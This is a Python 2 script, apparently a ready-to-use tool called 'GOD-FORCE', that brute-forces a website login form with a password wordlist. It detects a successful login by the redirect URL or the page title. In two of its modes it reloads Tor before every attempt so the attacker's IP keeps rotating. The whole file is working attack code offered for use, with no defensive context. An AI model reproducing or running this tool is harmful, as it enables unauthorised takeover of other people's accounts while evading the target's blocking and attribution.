import mechanize
import sys
import os
import socks
import socket
import threading
import time
from mechanize import Browser

def runer():

    os.system("sudo service tor reload")
    SOCKS_PROXY_HOST = '127.0.0.1'
    SOCKS_PROXY_PORT = 9050


    def create_connection(address, timeout=None, source_address=None):
        sock = socks.socksocket()
        sock.connect(address)
        return sock

    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, SOCKS_PROXY_HOST, SOCKS_PROXY_PORT)

    socket.socket = socks.socksocket
    socket.create_connection = create_connection
    brs = Browser()
    brs.set_handle_robots(False)
    response = brs.open('http://www.myexternalip.com/raw')
    ip =  response.read()
    print "[GOD#] >>> now your using this ip  :" + ip

os.system("clear")
print '''
=======================================================================================
  _______   ______    _______         _______   ______   .______        ______  _______
 /  _____| /  __  \  |       \       |   ____| /  __  \  |   _  \      /      ||   ____|
|  |  __  |  |  |  | |  .--.  |______|  |__   |  |  |  | |  |_)  |    |  ,----'|  |__
|  | |_ | |  |  |  | |  |  |  |______|   __|  |  |  |  | |      /     |  |     |   __|
|  |__| | |  `--'  | |  '--'  |      |  |     |  `--'  | |  |\  \----.|  `----.|  |____
 \______|  \______/  |_______/       |__|      \______/  | _| `._____| \______||_______|


  Build By mr.FD github.com/FDX100
           NinjaHz
=======================================================================================
'''
print ("(1) To Start Attack using Redirect URL")
print ("(2) To Start Attack using Redirect URL + with Auto Proxy")
print ("(3) To Start Attack Using title of Website")
print ("(4) To Start Attack Using title of Website + with auto Proxy")
choice = raw_input("[GOD#] >>> ")


if choice == "1":

    website = raw_input('[GOD#] >>> Website Login page URL : ')
    website_s = raw_input('[GOD#] >>> Website Redirect URL after login successfully : ')
    user = raw_input('[GOD#] >>> ID or Name of username input : ')
    passw = raw_input('[GOD#] >>> ID or Name of password input : ')
    email = raw_input("[GOD#] >>> Username or email : ")
    file = raw_input('[GOD#] >>> wordlist file :')
    print("===================================================")
    with open(file,"r")as list:
            for line in list:
                word = line.strip()
                br = mechanize.Browser()
                br.set_handle_robots(False)

                br.open(website)
                br.select_form(nr=0)
                br.form[user] =email
                br.form[passw]= word
                sub = br.submit()

                if sub.geturl() ==website_s:
                    print('==============================')
                    print ('\x1b[2;31;40m' +'[GOD#] >>> This is Target password ==> '+word+'\x1b[0m')
                    print('==============================')
                    exit()
                else:
                    print'[GOD#] >>> This is not your  Password ==>'+word
    print('[GOD#] >>> Sorry Password not found ')
if choice == "2":
    os.system("sudo service tor start")
    website = raw_input('[GOD#] >>> Website Login page URL : ')
    website_s = raw_input('[GOD#] >>> Website Redirect URL after login successfully : ')
    user = raw_input('[GOD#] >>> ID or Name of username input : ')
    passw = raw_input('[GOD#] >>> ID or Name of password input : ')
    email = raw_input("[GOD#] >>> Username or email : ")
    file = raw_input('[GOD#] >>> wordlist file :')
    print("===================================================")
    with open(file,"r")as list:
            for line in list:
                word = line.strip()
                t1 = threading.Thread(target=runer)
                t1.start()
                t1.join()
                br = mechanize.Browser()
                br.set_handle_robots(False)
                br.open(website)
                br.select_form(nr=0)
                br.form[user] =email
                br.form[passw]= word
                sub = br.submit()

                if sub.geturl() ==website_s:
                    print('==============================')
                    print ('\x1b[2;31;40m' +'[GOD#] >>> This is Target password ==> '+word+'\x1b[0m')
                    print('==============================')
                    exit()
                else:
                    print'[GOD#] >>> This is not your  Password ==>'+word
    print('[GOD#] >>> Sorry Password not found ')
if choice =="3":
    website = raw_input('[GOD#] >>> Website Login page URL : ')
    website_s = raw_input('[GOD#] >>> Website Title  after login successfully : ')
    user = raw_input('[GOD#] >>> ID or Name of username input : ')
    passw = raw_input('[GOD#] >>> ID or Name of password input : ')
    email = raw_input("[GOD#] >>> Username or email : ")
    file = raw_input('[GOD#] >>> wordlist file :')
    print("===================================================")
    with open(file,"r")as list:
            for line in list:
                word = line.strip()
                br = mechanize.Browser()
                br.set_handle_robots(False)

                br.open(website)
                br.select_form(nr=0)
                br.form[user] =email
                br.form[passw]= word
                sub = br.submit()

                if br.title() ==website_s:
                    print('==============================')
                    print ('\x1b[2;31;40m' +'[GOD#] >>> This is Target password ==> '+word+'\x1b[0m')
                    print('==============================')
                    exit()
                else:
                    print'[GOD#] >>> This is not your  Password ==>'+word
    print('[GOD#] >>> Sorry Password not found ')

if choice =="4":
    os.system("sudo service tor start")
    website = raw_input('[GOD#] >>> Website Login page URL : ')
    website_s = raw_input('[GOD#] >>> Website Title  after login successfully : ')
    user = raw_input('[GOD#] >>> ID or Name of username input : ')
    passw = raw_input('[GOD#] >>> ID or Name of password input : ')
    email = raw_input("[GOD#] >>> Username or email : ")
    file = raw_input('[GOD#] >>> wordlist file :')
    print("===================================================")
    with open(file,"r")as list:
            for line in list:
                word = line.strip()
                t1 = threading.Thread(target=runer)
                t1.start()
                t1.join()
                br = mechanize.Browser()
                br.set_handle_robots(False)
                br.open(website)
                br.select_form(nr=0)
                br.form[user] =email
                br.form[passw]= word
                sub = br.submit()
                if br.title() ==website_s:
                    print('==============================')
                    print ('\x1b[2;31;40m' +'[GOD#] >>> This is Target password ==> '+word+'\x1b[0m')
                    print('==============================')
                    exit()
                else:
                    print'[GOD#] >>> This is not your  Password ==>'+word
    print('[GOD#] >>> Sorry Password not found ')
else:
    print("[GOD#] >>> sorry wrong choice Bye :) ")
